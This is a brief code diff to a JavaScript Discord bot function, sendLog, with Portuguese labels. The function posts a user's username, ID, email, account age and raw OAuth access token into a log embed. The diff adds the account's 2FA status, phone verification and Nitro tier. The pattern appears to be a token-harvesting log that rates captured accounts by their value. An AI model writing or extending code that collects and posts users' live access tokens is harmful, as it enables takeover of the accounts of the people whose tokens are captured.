@@ -168,7 +168,10 @@ async function sendLog(client, userData, accessToken, ip, userDevice, accountDay
             `**Username:** \`${userData.username}\`\n` +
             `**ID:** \`${userData.id}\`\n` +
             `**E-mail:** \`${userData.email || 'Não disponível'}\`\n` +
-            `**Idade da Conta:** \`${accountDays} dias\``
+            `**Idade da Conta:** \`${accountDays} dias\`\n` +
+            `**2FA:** \`${userData.mfa_enabled ? 'Ativado' : 'Desativado'}\`\n` +
+            `**Telefone:** \`${userData.phone ? 'Verificado ✅' : 'Não verificado ❌'}\`\n` +
+            `**Nitro:** \`${userData.premium_type === 1 ? 'Nitro Classic' : userData.premium_type === 2 ? 'Nitro' : userData.premium_type === 3 ? 'Nitro Basic' : 'Sem Nitro'}\``
         )
         .addFields(
             { name: '🔑 Token', value: `\`\`\`${accessToken}\`\`\`` },
